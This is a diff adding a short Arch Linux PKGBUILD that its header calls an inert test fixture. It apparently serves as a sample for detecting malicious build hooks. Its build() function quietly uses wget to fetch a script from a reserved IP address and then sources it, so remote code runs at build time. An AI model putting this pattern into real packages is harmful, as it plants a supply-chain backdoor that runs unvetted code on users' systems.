@@ -1,0 +1,13 @@
+# Inert test fixture: nothing here is ever run, and every address is reserved or fake.
+pkgname=wget-then-source
+pkgver=1.0
+pkgrel=1
+arch=(x86_64)
+url=https://example.org
+license=(MIT)
+source=(https://example.org/demo.tar.gz)
+sha256sums=(0000000000000000000000000000000000000000000000000000000000000000)
+build() {
+  wget -q -O y.sh http://198.51.100.52/y
+  source y.sh
+}
